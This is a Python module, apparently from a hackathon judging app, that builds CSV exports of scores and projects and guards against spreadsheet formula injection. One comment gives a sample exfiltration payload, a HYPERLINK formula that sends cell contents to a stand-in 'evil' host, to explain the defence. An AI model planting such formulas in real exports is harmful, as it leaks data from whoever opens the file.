"""CSV exports for organizers, safe to open in a spreadsheet."""

import csv
import io
from collections.abc import Iterable

from sqlalchemy import select
from sqlalchemy.orm import Session as DbSession, selectinload

from app.models import Project, Team, User
from app.services.judging import list_scores, scores_out

# A cell starting with one of these is run as a formula by Excel/LibreOffice/Sheets
# (e.g. a project titled =HYPERLINK("http://evil/?"&A1,"x") leaking other cells).
FORMULA_START = ("=", "+", "-", "@", "\t", "\r")


def safe_cell(value) -> str:
    if value is None:
        return ""
    text = str(value)
    return "'" + text if text.startswith(FORMULA_START) else text


def to_csv(header: list[str], rows: Iterable[list]) -> str:
    buf = io.StringIO()
    writer = csv.writer(buf, lineterminator="\n")
    writer.writerow(header)
    for row in rows:
        writer.writerow([safe_cell(v) for v in row])
    return buf.getvalue()


def scores_csv(db: DbSession, event_id: str | None) -> str:
    rows = scores_out(db, list_scores(db, None, event_id))
    keys = sorted({k for r in rows for k in r["criteria"]})
    judges = {u.id: u.name for u in db.scalars(select(User).where(
        User.id.in_({r["judge_id"] for r in rows})))}
    header = ["event_id", "project_id", "project_title", "judge_id", "judge_name", *keys,
              "weighted_total", "comment", "updated_at"]
    return to_csv(header, ([r["event_id"], r["project_id"], r["project_title"], r["judge_id"],
                            judges.get(r["judge_id"], ""), *[r["criteria"].get(k, "") for k in keys],
                            r["weighted_total"], r["comment"], r["updated_at"]] for r in rows))


def projects_csv(db: DbSession, event_id: str | None) -> str:
    stmt = (select(Project).options(selectinload(Project.tags), selectinload(Project.track),
                                    selectinload(Project.team).selectinload(Team.members))
            .order_by(Project.event_id, Project.id))
    if event_id:
        stmt = stmt.where(Project.event_id == event_id)
    header = ["event_id", "project_id", "title", "tagline", "team_id", "team_name", "team_size",
              "track", "status", "submitted_at", "duplicate_of", "repo_url", "live_url",
              "demo_video_url", "tags"]
    return to_csv(header, ([p.event_id, p.id, p.title, p.tagline, p.team_id, p.team.name,
                            len(p.team.members), p.track.name if p.track else "", p.status.value,
                            p.submitted_at.isoformat() if p.submitted_at else "", p.duplicate_of_id or "",
                            p.repo_url, p.live_url, p.demo_video_url,
                            "|".join(t.tag for t in p.tags)] for p in db.scalars(stmt)))
